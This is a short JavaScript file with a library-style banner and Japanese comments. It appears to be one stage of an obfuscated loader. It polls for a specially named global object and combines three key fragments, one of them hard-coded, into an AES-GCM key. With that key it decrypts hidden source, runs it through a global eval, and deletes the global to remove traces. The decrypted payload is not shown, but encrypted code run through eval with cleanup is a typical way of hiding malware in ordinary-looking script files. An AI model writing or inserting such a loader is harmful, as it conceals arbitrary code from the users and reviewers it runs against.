/*! kalto-6 */
(function(_){"use strict";
var _b="Bm9aazBMJqCLFIlOD1WAC8FhBdUmL8aDW9CVbGA4nWw=";
function _x(s){var b=atob(s),u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);return u;}
var KC=_x(_b);
async function _do(){
 var k5=_['_$r5h968']; if(!k5){ setTimeout(_do,50); return; }
 // Q を再生成して剥がす
 var Qseed=new Uint8Array(k5.b.length+1);Qseed.set(k5.b,0);Qseed[k5.b.length]=0x51;
 var Q=await k5._e(Qseed,k5.r.length);
 var ctRaw=k5._n(k5.r,Q);
 // KEY = KA xor KB xor KC
 var KEY=new Uint8Array(32);
 for(var i=0;i<32;i++) KEY[i]=k5.a[i]^k5.b[i]^KC[i];
 var ck=await crypto.subtle.importKey('raw',KEY,{name:'AES-GCM'},false,['decrypt']);
 var pt=await crypto.subtle.decrypt({name:'AES-GCM',iv:k5.v},ck,ctRaw);
 var src=new TextDecoder('utf-8').decode(new Uint8Array(pt));
 try{delete _['_$r5h968'];}catch(e){_['_$r5h968']=null;}
 // 実行 (グローバルスコープで)
 (0,eval)(src);
 _['_$t3_ir5']=(_['_$t3_ir5']||0)|2;
}
_['_$ujp7c6']={_run:_do};
_do();
})(this);
